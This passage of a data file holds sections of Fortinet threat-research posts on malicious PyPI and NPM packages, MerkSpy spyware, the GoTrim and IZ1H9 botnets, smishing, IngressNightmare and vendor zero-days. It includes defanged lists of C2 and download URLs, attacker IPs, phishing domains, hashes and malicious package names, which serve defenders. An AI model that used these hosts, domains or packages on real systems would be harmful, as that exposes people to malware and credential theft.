"URL\nhxxp://ad59t82g[.]com/1/lon2[.]bmphxxp://ad59t82g[.]com/1/text[.]bmphxxp://ad59t82g[.]com/1/d[.]bmphxxp://ad59t82g[.]com/1/t2[.]bmphxxp://ad59t82g[.]com/1/h[.]bmp\nIP Address/Hostname\nad59t82g[.]com202[.]79[.]173[.]4\nSHA256Hash\nc9817d415d34ea3ae07094dae818ffe8e3fb1d5bcb13eb0e65fd361b7859eda7 NetDiagnotor.exe (\u5929\u8c15\u5ba2\u6237\u7aef\u68c0\u6d4b\u5de5\u5177)284cf31ebb4e7dc827374934ad0726f72e7aaef49cadc6aa59d2a2ff672d3fe8 gpatchex.exe (\u68a6\u5e7b\u897f\u6e38\u66f4\u65b0\u7a0b\u5e8f)b2a3aaf4eb4deb85462e1ee39c84caf2830091c1bff8014ad13147897b25e24c Duoyi (\u6218\u76df\u5b89\u88c5\u7a0b\u5e8f)b763d77b7aaa83d6c4a9e749cd3c7638127e755d3dc843b15b6c4afce1f468b5 \u52b2\u821e\u56e2\u8054\u5408\u767b\u5f55\u5668.exe (\u7a97\u53e3\u5316)dcdbc3b246233befa25b67909a01b835f1875f4047875ef13f1b801cd2da6fcd Duoyi (\u6218\u76df\u5b89\u88c5\u7a0b\u5e8f)3fae0495fd0acc7722c2482c0ef3c6ab9ee41acbcaac46a8933c7b36b8896378 crashreporter.exef41236ab5ceffc5379fcf444de358cbc6f67beb31d0e0fd3f7ed0f501eb740ff yxqxunyou.exe (\u82f1\u96c4\u8054\u76df\u4f18\u5316)80b1d6411e29e51e54f20f46856d31b28e087e9244693e65d022b680c4ba00ce \u52b2\u821e\u56e2\u8054\u5408\u767b\u5f55\u5668.exe (\u7a97\u53e3\u5316)1a48347f5fc7c63cc03f30810f961133bd3912caf16ac403e11bc3491117181d manualupdate.exe (\u5929\u8c15\u624b\u52a8\u66f4\u65b0\u5de5\u5177)8748bb7512f16f8122779171686abe0fa0060f1126298290e240457dc90d0aa7 MatRepair.exe (\u53cd\u6050\u884c\u52a8\u5ba2\u6237\u7aef\u4fee\u590d\u7a0b\u5e8f)1354796b44239eef177431584848029161c232401a9580481dbfb5196465250e you.dllbef32532923903b12f04b54dd06ec81661f706c3b1397bc77c45492db3919248 you.dll033965f3063bc2a45e5bd3a57ffce098b9308668d70b9b3063f066df5f3e55dd you.dll922512203c7b9fa67e8db2f588ff4945f63e20c4bc0aafccdba749a442808ace you.dll04edb6585118d09205ee693a54249ed68ebbf68b3fc3d711d2aa0c815b7b3a23 shellcode51c7f320b95a64bcff050da86c7884bb4f89a5d00073d747f0da7345c8a4501f \u5b66\u7c4d\u7cfb\u7edf.dllff0c28c81cd0afd78f78c79863c9f4c8afd9d3877a213dfc2dbb55360b7d93ab ConsoleApp2.exea27dc6e5aea0c3168117cfde2adb01f73f20881fc6485b768915216c46115064 \u5dee\u5f02\u5c4f\u5e55.vll8f0079a41a262536f502b4b57473effd6ab7955bc2d6e99e0910df18e990a9f6 \u6587\u4ef6\u7ba1\u7406.vll37104f3b3646f5ffc8c78778ec5fdc924ebb5e5756cb162c0e409d24bedf406d \u4e0a\u7ebf\u6a21\u5757.dll (online module)a30b68ed39c1517d10b747c2fcd7a72cb12dc8f434203243e7c50df0e56d17d0 \u767b\u5f55\u6a21\u5757.dll (login module)", "source": "Fortinet"}, {"title": "Introduction", "content": "Phishing remains one of the most prevalent cybersecurity threats worldwide, posing risks such as financial loss, data theft, reputational harm, and malware deployment. As phishing tactics grow more sophisticated, attackers are also expanding their targets across various platforms and services. The use of AI has further refined these techniques, making phishing attempts more deceptive and harder to detect. Attackers increasingly use personalized messages and convincing fake websites to evade traditional security measures, making detection more difficult for security teams.\nOrganizations must strengthen their defenses to keep pace with the rapidly evolving threat landscape. While traditional defenses like email filters and blacklists can block known threats, they are less effective against emerging and AI-driven phishing attacks. Real-time anti-phishing (RTAP) solutions help address this challenge by using AI and machine learning to identify and mitigate both large-scale phishing campaigns and highly targeted spear-phishing attacks as they occur.\nAccording to the 2024 Verizon DBIR report, the median time for a user to fall prey to a phishing email is less than 60 seconds.[1]", "source": "Fortinet"}, {"title": "ioc", "content": "[facebook]case-id-10012125556[.]vercel[.]apppolicy-violation-10002321704[.]github[.]io\n[roblox]robux-generator---cpa[.]firebaseapp[.]comrbxodi[.]blogspot[.]com\n[telegram]www[.]telegramtgtg[.]comwww[.]91gsh[.]com\n[ionos]67a34b6bfc0d210a820d0cf5--brilliant-mermaid-bad0bd[.]netlify[.]appgworldhomes[.]com/ionos-ag/ionos-es/login/login[.]php\n[coinbase]000414-coinbase[.]comcoinbsphnnumbe[.]gitbook[.]io/us\n[paypal]paypalloginonline[.]blogspot[.]comniemalssoeder[.]de/c/index/myaccount\n[vkontakte]uncloabatles[.]ru/votes/7838610vim[.]vimeo18[.]ru/votes/3818905\n[1]https://www.verizon.com/business/resources/infographics/2024-dbir-infographic.pdf", "source": "Fortinet"}, {"title": "Introduction", "content": "Affected Platforms:LinuxImpacted Users:Any organizationImpact:Remote attackers gain control of the vulnerable systemsSeverity Level:Critical\nIn September 2023, our FortiGuard Labs team observed that the IZ1H9 Mirai-based DDoS campaign has aggressively updated its arsenal of exploits. Thirteen payloads were included in this variant, including D-Link devices, Netis wireless router, Sunhillo SureLine, Geutebruck IP camera, Yealink Device Management, Zyxel devices, TP-Link Archer, Korenix Jetwave, and TOTOLINK routers.\nBased on the trigger counts recorded by our IPS signatures, it is evident that peak exploitation occurred on September 6, with trigger counts ranging from the thousands to even tens of thousands. This highlights the campaign's capacity to infect vulnerable devices and dramatically expand its botnet through the swift utilization of recently released exploit code, which encompasses numerous CVEs.\nIn this article, we will elaborate on how this threat leverages new vulnerabilities to control affected devices, along with the details of IZ1H9.", "source": "Fortinet"}, {"title": "Conclusion", "content": "IoT devices have long been an attractive target for threat actors, with remote code execution attacks posing the most common and concerning threats to both IoT devices and Linux servers. The exposure of vulnerable devices can result in severe security risks. Despite the availability of patches for these vulnerabilities, the number of exploit triggers remains alarmingly high, often numbering in the thousands.\nWhat amplifies the impact of the IZ1H9 Campaign are the rapid updates to the vulnerabilities it exploits. Once an attacker gains control of a vulnerable device, they can incorporate these newly compromised devices into their botnet, enabling them to launch further attacks like DDoS attacks and brute-force.\nTo counter this threat, it is strongly recommended that organizations promptly apply patches when available and always change default login credentials for devices.", "source": "Fortinet"}, {"title": "ioc", "content": "URLs:\n194[.]180[.]48[.]1002[.]56[.]59[.]215212[.]192[.]241[.]72\nFiles:\nc8cf29e56760c50fa815a0c1c14c17641f01b9c6a4aed3e0517e2ca722238f631e15d7cd0b4682a86620b3046548bdf3f39c969324a85755216c2a526d784c0d7b9dce89619c16ac7d2e128749ad92444fe33654792a8b9ed2a3bce1fee82e6ab5daf57827ced323a39261a7e19f5551071b5095f0973f1397d5e4c2fcc39930b523ea86ebfd666153078593476ca9bd069d6f37fa7846af9e53b1e01c977a178d07f15dd7d055b16d50cb271995b768fdd3ca6be121f6a35b61b917dfa3393834628bcfc40218095c65678b52ce13cea4904ce966d0fd47e691c3cb039871ecafc176f7b692a5ff93c7c66eee4941acf1b886ee9f4c070faf043b16f7e65c11df9ee47c783fbe8c3301ed519033fc92b05d7fd272d35c64b424a7e46c6da43b737ba9e84b5166134d491193be3305afa273733c35c028114d8b1f092940b9a30aa9836174f231074d4d55c819f6f1570a24bc3ed4d9dd5667a04664acb57147", "source": "Fortinet"}, {"title": "Introduction", "content": "Impacted Users:iPhone users in IndiaImpact:Possible financial loss; stolen information can be used for future attacksSeverity Level:Medium\nThe FortiGuard Labs Threat Research team recently observed a number of social media posts commenting on a fraud campaign targeting India Post users. India Post is India's government-operated postal system. It is part of the Ministry of Communications and has a vast network of over 150,000 post offices across the country, making it one of the largest postal systems in the world.\nIn this campaign, iPhone users are being targeted by smishing attacks claiming to be from India Post. This scam involves sending an iMessage to iPhone users that falsely claims that a package is waiting at an India Post warehouse.\nPublicreportingsuggests this campaign is being attributed to a China-based threat actor known as theSmishing Triad. This group has previously targeted other regions, including the US, UK, EU, UAE, KSA, and, most recently, Pakistan.\nWe have observed third-party email addresses such as Hotmail, Gmail, or Yahoo being used in phishing emails on iMessage. Apple allows users to create an Apple ID using these third-party email addresses as the primary email associated with their Apple ID. Once the Apple ID is created and configured for iMessage, the sender can use that third-party email address to send messages through iMessage. The messages often contain a short URL, leading to a fraudulent website.\nUpon investigation, we discovered a significant number of newly registered domains being used for current and potential phishing scams. This blog highlights the tools and methods used to propagate such phishing campaigns and explores the scale of these operations, the tactics employed by threat actors, and other relevant insights.", "source": "Fortinet"}, {"title": "Conclusion", "content": "The investment in registering these domain names alone exceeds USD 1500, not to mention additional costs for hosting and development. This significant investment highlights the threat actors' commitment, the phishing operation's scale, and its potential long-term impact. As a result, we feel that the likelihood of numerous victims falling prey to these scams is increased, leading to substantial financial losses, data breaches, and other security issues for individuals and organizations targeted by these domains.\nThis operation may also serve as a strategic initiative to raise funds to fuel operations in China. Because of this, awareness and proactive measures are crucial to mitigating the risks posed by these phishing activities.", "source": "Fortinet"}, {"title": "Introduction", "content": "Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:The stolen information can be used for future attackSeverity Level:High\nSpyware is malicious software engineered to covertly monitor and gather information from a user's computer without their awareness or consent. It can record activities like keystrokes, browsing behavior, and personal information, often transmitting this data to a third party for espionage or theft.\nFortiGuard Labs recently detected an attack exploiting the CVE-2021-40444 vulnerability in Microsoft Office. This flaw allows attackers to execute malicious code via specially crafted documents. In this instance, the exploitation led to the deployment of a spyware payload known as \"MerkSpy.\" MerkSpy is designed to clandestinely monitor user activities, capture sensitive information, and establish persistence on compromised systems.\nThis blog will dissect the stages of this complex attack, offering insights into the techniques used by cybercriminals to infiltrate systems and steal sensitive data.", "source": "Fortinet"}, {"title": "Conclusion", "content": "The initial phase of the attack leverages a vulnerability in the MSHTML component used by Internet Explorer. Upon exploitation, it initiates the download of a file named \"olerender.html,\" which contains JavaScript and embedded shellcode. This shellcode decodes the downloaded content to execute an injector responsible for loading the MerkSpy spyware into memory and integrating it with active system processes. MerkSpy is capable of sophisticated surveillance activities, including keystroke logging, screenshot capture, and harvesting Chrome browser login data. By understanding the intricacies of this attack chain, organizations can enhance their readiness and deploy effective defenses against such intrusions. FortiGuard Labs remains vigilant in monitoring these threats and offers ongoing intelligence to safeguard our users.", "source": "Fortinet"}, {"title": "ioc", "content": "IP Addresses\n45[.]89[.]53[.]46\nFiles\n92eb60179d1cf265a9e2094c9a54e025597101b8a78e2a57c19e4681df465e08\n95a3380f322f352cf7370c5af47f20b26238d96c3ad57b6bc972776cc294389a\n0ffadb53f9624950dea0e07fcffcc31404299230735746ca43d4db05e4d708c6\ndd369262074466ce937b52c0acd75abad112e395f353072ae11e3e888ac132a8\n569f6cd88806d9db9e92a579dea7a9241352d900f53ff7fe241b0006ba3f0e22\n6cdc2355cf07a240e78459dd4dd32e26210e22bf5e4a15ea08a984a5d9241067", "source": "Fortinet"}, {"title": "Introduction", "content": "FortiGuard Labsrecently encountered a previously unreported Content Management System (CMS) scanner and brute forcer written in the Go programming language (also commonly referred to as Golang). We took a closer look at this malware because it was being described in several online forums as being installed in compromised WordPress sites, but there were no publicly available analysis reports.\nAffected Platforms:Linux \nImpacted Users:Any organization \nImpact:Remote attackers gain control of the vulnerable systems \nSeverity Level:Critical\nGolang brute forcers are not new. For example, we previously reported on theStealthWorkercampaign in 2019. This new brute forcer is part of a new campaign we have named GoTrim because it was written in Go and uses \":::trim:::\"to split data communicated to and from the C2 server.\nSimilar to StealthWorker, GoTrim also utilizes abot networkto perform distributed brute force attacks. The earliest sample we found was from Sep 2022. That campaign is still ongoing at the time of writing.\nThis article details how this active botnet scans and compromises websites using WordPress and OpenCart. We also highlight some differences between samples collected from Sep to Nov 2022 at the end of the article.", "source": "Fortinet"}, {"title": "Conclusion", "content": "Although this malware is still a work in progress, the fact that it has a fully functional WordPress brute forcer combined with its anti-bot evasion techniques makes it a threat to watch for-especially with the immense popularity of the WordPress CMS, which powers millions of websites globally.\nBrute-forcing campaigns are dangerous as they may lead to server compromise and malware deployment. To mitigate this risk, website administrators should ensure that user accounts (especially administrator accounts) use strong passwords. Keeping the CMS software and associated plugins up to date also reduces the risk of malware infection by exploiting unpatched vulnerabilities.\nFortiGuard Labs will continue to monitor GoTrim's development.", "source": "Fortinet"}, {"title": "ioc", "content": "Files\n646ea89512e15fce61079d8f82302df5742e8e6e6c672a3726496281ad9bfd8a\n4b6d8590a2db42eda26d017a119287698c5b0ed91dd54222893f7164e40cb508\nc33e50c3be111c1401037cb42a0596a123347d5700cee8c42b2bd30cdf6b3be3\n71453640ebf7cf8c640429a605ffbf56dfc91124c4a35c2ca6e5ac0223f77532\n3188cbe5b60ed7c22c0ace143681b1c18f0e06658a314bdc4c7c4b8f77394729\n80fba2dcc7ea2e8ded32e8f6c145cf011ceb821e57fee383c02d4c5eaf8bbe00\nDe85f1916d6102fcbaceb9cef988fca211a9ea74599bf5c97a92039ccf2da5f7\n2a0397adb55436efa86d8569f78af0934b61f5b430fa00b49aa20a4994b73f4b\nDownload URLs\nhxxp://77[.]73[.]133[.]99/taka\nhxxp://77[.]73[.]133[.]99/trester\nhxxp://77[.]73[.]133[.]99/pause\nC2\nhxxp://77[.]73[.]133[.]99\nhxxp://77[.]73[.]133[.]99/selects?dram=1\nhxxp://77[.]73[.]133[.]99/selects?bilert=1\nhxxp://77[.]73[.]133[.]99/route?index=1\nhxxp://77[.]73[.]133[.]99/route?alert=1\nhxxp://89[.]208[.]107[.]12\nhxxp://89[.]208[.]107[.]12/selects?param=1\nhxxp://89[.]208[.]107[.]12/selects?walert=1", "source": "Fortinet"}, {"title": "Introduction", "content": "Affected platforms:All platforms where PyPI packages can be installedImpacted parties:Any individuals or institutions that have these malicious packages installedImpact:Leak of credentials, sensitive information, etc.Severity level:High\nVigilance is paramount in cybersecurity, especially when it comes to understanding and dissecting potentially malicious code. In this blog post, we'll delve into a piece of code designed (discordpy_bypass-1.7 ) to extract sensitive data from user systems. We'll analyze its components, functions, and methodologies to understand its purpose and approach.", "source": "Fortinet"}, {"title": "Introduction", "content": "FortiGuard Labs uses a proprietary, AI-driven OSS malware detection system to hunt for and monitor threats. Using this approach on the Python Package Index (PyPI) supply chain platform, we unearthed a malicious PyPI package named discordpy_bypass-1.7, published on March 10, 2024, and detected on March 12, 2024.\nThis code aims to covertly extract sensitive information from unsuspecting victims using a blend of persistence techniques, browser data extraction, and token harvesting. Understanding the origins and propagation methods of malicious code is paramount in its analysis. Authored by theaos, the author produced seven versions of the package, including versions 1.1, 1.2, 1.3, 1.4, 1.5, 1.6, and 1.7. The upgrade-colored_0.0.1 also exhibits similar malicious content as discordpy_bypass, indicating a consistent behavior pattern across versions.\n\"discordpy_bypass-1.7\" highlights the sort of ongoing threats seen across the cybersecurity landscape. This PyPI package version exhibits similar malicious behavior to previous malicious packages, focusing on extracting sensitive data from user systems through obfuscated code and evasion techniques targeting analysis environments. The code employs various checks to detect debugging or analysis environments and terminates itself if detected, showcasing the author's effort to evade scrutiny.\nThe code has three layers. The original Python code is encoded using base64 (the innermost layer). The encoded strings are then broken into separate pieces and encoded once again with some obfuscation techniques (intermediate layer). The obfuscated file is then compiled using pyinstaller into an exe (the last layer) put on a remote URL. The code in discordpy_bypass/discordpy_bypass.py fetches the code from the URL and runs it on the user's device. This underscores the critical need for vigilance and proactive measures to effectively detect and mitigate cybersecurity threats.", "source": "Fortinet"}, {"title": "Conclusion", "content": "Our investigation into the \"discordpy_bypass-1.7\" code has uncovered a clever and sneaky cyber threat to secretly steal important information from people's computers. What makes this code especially dangerous is how it tries to trick computer systems and experts who attempt to analyze it. It's like a master of disguise that can escape from being caught.\nThis discovery reminds us that the internet isn't always a safe place. We need to stay alert to protect ourselves from such threats. Understanding them helps us build stronger defenses and stay safe in our digital world. By working together and staying cautious, we can keep our personal information and digital lives secure.\nFortinet Protections\nFortiGuard AntiVirusdetects the malicious files identified in this report as\nupgrade-colored-0.0.1/colored/call.py:Python/Agent.COL!trupgrade-colored-0.0.1/colored_payload:Python/Agent.0337!trdiscordpy_bypass-1.0/discordpy_bypass/discordpy_bypass.py:Python/Disco.BYP!tr.dldrdiscordpy_bypass-1.1/discordpy_bypass/discordpy_bypass.py:Python/Disco.BYP!tr.dldrdiscordpy_bypass-1.2/discordpy_bypass/discordpy_bypass.py:Python/Disco.BYP!tr.dldrdiscordpy_bypass-1.3/discordpy_bypass/discordpy_bypass.py:Python/Disco.BYP!tr.dldrdiscordpy_bypass-1.4/discordpy_bypass/discordpy_bypass.py:Python/Disco.BYP!tr.dldrdiscordpy_bypass-1.5/discordpy_bypass/discordpy_bypass.py:Python/Disco.BYP!tr.dldrdiscordpy_bypass-1.6/discordpy_bypass/discordpy_bypass.py:Python/Disco.BYP!tr.dldrdiscordpy_bypass-1.7/discordpy_bypass/discordpy_bypass.py:Python/Disco.BYP!tr.dldrdiscordpy_bypass-1.7/discordpy_bypass/discordpy_bypass_payload.exe:Python/Agent.514A!trdiscordpy_bypass-1.7/discordpy_bypass/discordpy_bypass_python.py:Python/Agent.C77E!trdiscordpy_bypass-1.6/discordpy_bypass/discordpy_bypass_payload.py:Python/Agent.7684!tr\nThe FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Customers running current AntiVirus updates are protected.\nTheFortiGuard Web FilteringService detects and blocks the download URLs cited in this report as Malicious.\nTheFortiDevSecSCA scanner detects malicious packages, including those cited in this report that may operate as dependencies in users' projects in test phases, and prevents those dependencies from being introduced into users' products.\nIf you believe these or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team.\nIOCs", "source": "Fortinet"}, {"title": "Introduction", "content": "Affected Platforms:Ingress-NGINX Containers v1.11.0-4, v1.12.0, <v1.11.0Impacted Users:Any OrganizationImpact:Attackers gain control of the vulnerable systemsSeverity Level:Critical\nOn March 24, 2025, researchers from Wiz, Inc. disclosed a critical group of vulnerabilities in the Kubernetes Ingress-NGINX controller, dubbedIngressNightmare. Among the most severe issues isCVE\u20112025\u20111974, which allows an attacker with only network access to the admission webhook to potentially achieve remote code execution (RCE) in the ingress controller pod. This vulnerability was privately disclosed earlier in March and publicly announced after patches became available. It has a CVSS rating of 9.8, underscoring the severity and urgency of applying the fixes.\nThis article summarizes how these CVEs work, explains our proof-of-concept demo of the exploit, and outlines mitigations and detection strategies. We'll also show how Lacework FortiCNAPP and the broader Fortinet Security Fabric provide coverage for these kinds of attacks.", "source": "Fortinet"}, {"title": "Summary", "content": "CVE\u20112025\u20111974: A critical vulnerability that allows malicious, unauthenticated requests to the Ingress-NGINX admission webhook. Attackers can feed the controller a crafted Ingress object containing malicious NGINX directives, leading to RCE in the controller pod. \nAdditional Annotation Injection CVEs: The same family (sometimes called IngressNightmare) includes additional bugs in how Ingress annotations like auth-url, auth-tls-match-cn, and mirror-target are sanitized. Attackers can chain these bugs with CVE\u20112025\u20111974 to inject malicious NGINX configurations and ultimately run arbitrary code.\nKey Point: In many configurations, the admission webhook is reachable from within the cluster's network (i.e., from any pod). That means a compromised pod or a foothold within the cluster can exploit these annotation injection flawswithoutneeding Kubernetes API credentials.", "source": "Fortinet"}, {"title": "Summary", "content": "Because this vulnerability chain can yield near-complete cluster compromise, remediation should be a top priority. Key recommendations include:\nUpgrade Ingress-NGINXto v1.12.1 (or later) or v1.11.5 (or later). This patch removes the risky validation approach that enabled RCE. \nRestrict Access to the Admission Webhookif you cannot upgrade immediately. Apply network policies so only the Kubernetes API server can connect to the webhook. \nDisable Unused Featuressuch as snippet annotations, TLS client auth, or mirroring if they aren't required. The fewer potential injection points, the better. \nHarden Service Accounts. Avoid granting cluster-wide privileges to the service account used by ingress. If the controller is compromised, the blast radius is significantly reduced if that account has minimal permissions.\nFor a more detailed look at the patch details, see:\nFortinet Threat Signal Report \nKubernetes Advisory: CVE\u20112025\u20111974", "source": "Fortinet"}, {"title": "Conclusion", "content": "IngressNightmare(CVE\u20112025\u20111974 and related flaws) highlights the importance of secure ingress configurations and strict controls on admission webhooks. By exploiting an internal vantage point, attackers can pivot from a low-privileged pod into a full cluster compromise if the ingress controller is left unpatched and overly exposed.\nFortunately, patching and hardening are straightforward:\nUpgradeto a fixed version of Ingress-NGINX (v1.12.1+ or v1.11.5+). \nLock downnetwork access to the webhook service. \nReduceyour controller's service account privileges.\nContinuous visibility and detection go hand in hand with strong prevention. Tools likeLacework FortiCNAPPand theFortinet Security Fabricadd significant layers of protection for both container runtime security and the cloud control plane. Organizations can keep their Kubernetes clusters resilient against emerging threats like IngressNightmare by staying current on vulnerability disclosures and employing a defense-in-depth approach.\nKubernetes Advisory on CVE\u20112025\u20111974 \nWiz Research Blog: IngressNightmare Technical Analysis \nFortiGuard Threat Signal Report on Kubernetes IngressNightmare \nLacework FortiCNAPP Documentation & Guides\nThank you for reading-and be sure to watch thedemo videofor an in-depth look at this exploit in action. Stay vigilant, and keep your clusters secure!\nFortinet Protections\nFortiGuard Labs provides an IPS signature against attacks exploiting the following vulnerability:\nCVE-2025-1974: Kubernetes.Ingress.NGINX.Controller.Remote.Code.Execution\nIf you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team.", "source": "Fortinet"}, {"title": "Introduction", "content": "This past March, I discovered and reported several zero-day vulnerabilities in Adobe InDesign to Adobe. And on Patch Tuesday, July 11, 2023, Adobe released theirsecurity patchesto fix them.The vulnerabilities are identified as CVE-2023-29308, CVE-2023-29309, CVE-2023-29310, CVE-2023-29311, CVE-2023-29312, CVE-2023-29313, CVE-2023-29314, CVE-2023-29315, CVE-2023-29316, CVE-2023-29317, CVE-2023-29318, and CVE-2023-29319. All of these vulnerabilities have been assigned a Critical or Important severity. They also each have different root causes related to a single InDesign plugin. Due to the severity of these vulnerabilities, we suggest that users apply the Adobe patch as soon as possible.\nAffected platforms:Windows and macOSImpacted parties:Users of Adobe InDesign 2023 version 18.3 and earlier. Users of Adobe InDesign 2022 version 17.4.1 and earlier.Impact:Multiple vulnerabilities leading to memory leaks or arbitrary code execution.Severity level:Critical and Important\nFollowing are some details on these vulnerabilities. More information can be found on the related FortinetZero DayAdvisory pages by clicking on the CVE links below:", "source": "Fortinet"}, {"title": "Introduction", "content": "Late May 2022, I discovered and reported multiple zero-day vulnerabilities in Autodesk Design Review, Autodesk Subassembly Composer, Autodesk Moldflow Communicator, and Autodesk Dwg2Spd. Recently, Autodesk released severalsecurity patches,security patches,security patches,security patches&security patcheswhich fixed them. These vulnerabilities are identified as CVE-2022-33883, CVE-2022-27525, CVE-2022-41306, CVE-2022-42934, CVE-2022-42935, CVE-2022-42936, CVE-2022-42937, CVE-2022-42933, CVE-2022-42943, CVE-2022-41310, CVE-2022-42040, CVE-2022-42939, CVE-2022-42942, CVE-2022-42941, CVE-2022-42938, CVE-2022-41309, CVE-2022-42944, CVE-2022-33890, CVE-2022-27526, CVE-2022-33888, CVE-2022-41301, CVE-2022-41305, CVE-2022-41307, and CVE-2022-41308. All of these vulnerabilities have different root causes pertaining to the decoding of several file formats by the vulnerable Autodesk product. Due to the severity of these vulnerabilities, we suggest users apply the Autodesk patches as soon as possible.\nAffected platforms:WindowsImpacted parties:\nUsers of Autodesk AutoCAD versions 2023.1.0 and\u202fearlierUsers of Autodesk AutoCAD versions 2022.1.2 and\u202fearlierUsers of Autodesk AutoCAD versions 2021.1.2 and\u202fearlierUsers of Autodesk AutoCAD versions 2020.1.5 and\u202fearlierUsers of Autodesk Subassembly Composer 2023 versions 2023.0\u202fand\u202fearlierUsers of Autodesk Subassembly Composer 2022 versions 2022.2.0\u202fand\u202fearlierUsers of Autodesk Subassembly Composer 2021 versions 2021.3.1\u202fand\u202fearlierUsers of Autodesk Subassembly Composer 2020 versions 2020.6.2\u202fand\u202fearlierUsers of Autodesk Design Review versions 2018 Hotfix 5\u202fand\u202fearlierUsers of Autodesk Moldflow Communicator versions 2022 and earlierUsers of Autodesk Design Review versions 2018 Hotfix 7\u202fand\u202fearlier\nImpact:Multiple vulnerabilities leading to Arbitrary Code Execution or Information Disclosure.Severity level:High\nFollowing are some details on these vulnerabilities. More information can be found on the related FortiGuard Labs Zero-Day Advisory pages by clicking on the CVE links below:", "source": "Fortinet"}, {"title": "Introduction", "content": "Affected platforms:All platforms where NPM packages can be installedImpacted parties:Any individuals or institutions that have these malicious packages installedImpact:Leak of credentials, sensitive information, source code, etc.Severity level:High\nOver the past few months, the FortiGuard Labs team has discovered several malicious packages hidden in NPM (Node Package Manager), the largest software registry for the JavaScript programming language. These packages were found through a system dedicated to discover malicious open-source packages from various ecosystems e.g. PyPI, NPM. In this blog, we will look at some of these packages, grouping them based on similar styles of code or functions.\nIn general, most of these malicious packages use install scripts that run pre or post-install. Whenever an NPM package is installed, those scripts are run as well. An example of this is shown below.\nEvery package we found aims to steal sensitive data, such as system or user information, via a webhook or file-sharing link. Let's explore the sets of packages below.", "source": "Fortinet"}, {"title": "Conclusion", "content": "This blog groups together a collection of malicious NPM packages that use install scripts to steal users' sensitive info based on styles of code or functions. End users should watch for packages that employ suspicious install scripts and exercise caution. We will continue hunting for and reporting malicious packages to help users avoid becoming victims.", "source": "Fortinet"}, {"title": "ioc", "content": "@zola-helpers/client-1.0.1 index.mjs\nMD5: e905c2915762e6c1fa57ff3b444411da\n@zola-helpers/client-1.0.2 index.mjs\nMD5: 1e5a38b17453379af9107a9afce0963f\n@zola-helpers/client-1.0.3 index.mjs\nMD5: c7325f2347833eba9869926226027330\n@next-translate-root/i18n-1.0.1 index.mjs\nMD5: cb37bd25c3011ffdd10c0db976c77b45\n@next-translate-root/i18n-1.0.2 index.mjs\nMD5: c4bf513d91909de6d8c8e28fe317950a\nsuncorp-styleguide-base-1.0.3 index.mjs\nMD5: 404c75ee8c8a2241e94773a5f46cd372\nsuncorp-styleguide-base-1.0.4 index.mjs\nMD5: 0b4da6e4a3d7f0d43afc1ce5a567aeed\nsuncorp-styleguide-base-1.0.5 index.mjs\nMD5: fbf108d9534e2a065ba62198d7ab226c\n@ag-grid-react/lib-1.0.1 index.mjs\nMD5: 42d7f4f9e4d837c5f1217165e92d0136\n@next-translate-root/locales-1.0.0 index.mjs\nMD5: 312368807bee4e8876acec4dba528f13\n@next-translate-root/locales-1.0.1 index.mjs\nMD5: cb37bd25c3011ffdd10c0db976c77b45\n@next-translate-root/locales-1.0.2 index.mjs\nMD5: c4bf513d91909de6d8c8e28fe317950a\n@dtx-company/flowcode-generator-types-200000.0.2 index.js\nMD5: 1b80da13c2d440b51de3e3b1f84b30b6\nsquarespace-abtest-1.0.1 index.js\nMD5: 0976fc4401a315d8182828d07b0e4a02\nruamel.taml.clib-0.1.2 index.js\nMD5: 489af9e516d133f8341bc50068b3a505\nregily-1.0.0 index.js\nMD5: 8333f68439addfe5d80d7cf8646d74f6\ndeveloper-scaffold-full-width-wrapper-1.9.9 index.js\nMD5: c627ce5ec695ea663b88a09fb31ea319\ndeveloper-scaffold-full-width-wrapper-21.0.9 index.js\nMD5: 563cf757e5f61a592f53506c81360e4a\n@abb-americas/angular-utilities-1.0.0index.js\nMD5: 2965d88976fee79d1e3ef69e5edc5d83\n@abb-americas/image-scaler-1.0.0index.js\nMD5: 0876c5969dc829f2f56b455ae38a2536\n@abdulmz/mz-test-1.1.1index.js\nMD5: ecd47a29a7e5132f94b1c7c0689e2e5a\n@ikea-aoa/component-financial-services-99.0.1index.js\nMD5: 025809495e179b4f7ef0db8af88381e7\n@ikea-aoa/component-lightbox-99.0.1index.js\nMD5: 025809495e179b4f7ef0db8af88381e7\n@ikea-aoa/component-popover-99.0.0index.js\nMD5: 025809495e179b4f7ef0db8af88381e7\n@cima/prism-utils-23.2.1 installer.js\nMD5: 42d84beccb38c08700920b70549f5a87\n@cima/prism-utils-23.2.2 installer.js\nMD5: 25de187869441c3aa506ddc5fe6839ea\ndiscorddd.jss-1.4.9 index.js\nMD5: dc60d3e82ff0273309a2a9e1b7f89ea3\ndiscorddd.jss-1.5.0 index.js\nMD5: 740eca0a347fe0d0aa8ca8ec4ebf2dd2\ndiscorddd.jss-1.6.4 index.js\nMD5: 5182a61ee33247e2a426c4ddfe8196dc\nsaaaaaaaaaaaaaaaaaaaaaaa-1.4.2 index.js\nMD5: 8458b6a4196e5d86e241c758ce89d1e5\nevernote-thrift-1.9.99 index.js\nMD5: 359f456996c39e7882afeda8fbbf226f\nen-features-rollout-1.90.9 index.js\nMD5: 0f67856db1e0c466d13079cc9cb16963\nen-conduit-electron-1.90.9 index.js\nMD5: 0f67856db1e0c466d13079cc9cb16963\nen-conduit-electron-auth-1.90.9 index.js\nMD5: 0f67856db1e0c466d13079cc9cb16963\nen-conduit-electron-worker-1.90.9 index.js\nMD5: 0f67856db1e0c466d13079cc9cb16963\nen-thrift-internal-2.30.9 index.js\nMD5: 0f67856db1e0c466d13079cc9cb16963\nen-conduit-electron-renderer-1.90.9 index.js\nMD5: 0f67856db1e0c466d13079cc9cb16963\n@expue/webpack-0.0.3-alpha.0 index.js\nMD5: 084c4c5a1d36fbdab6705a2fbd7e849e\n@expue/core-0.0.3-alpha.0 index.js\nMD5: 8b82f6112b22bd67cccc4ad238bfea7c\n@expue/vue3-renderer-0.0.3-alpha.0 index.js\nMD5: 084c4c5a1d36fbdab6705a2fbd7e849e\n@fixedwidthtable/fixedwidthtable-0.0.2 index.js\nMD5: 084c4c5a1d36fbdab6705a2fbd7e849e\n@virtualsearchtable/virtualsearchtable-0.1.1 index.js\nMD5: 37f9d6a97af8d7589bbc11aadcf185ec\nbinarium-crm-1.0.0 index.js\nMD5: acf9777d3fabc82b49ddb096147de6a9\nbinarium-crm-1.0.9 index.js\nMD5: 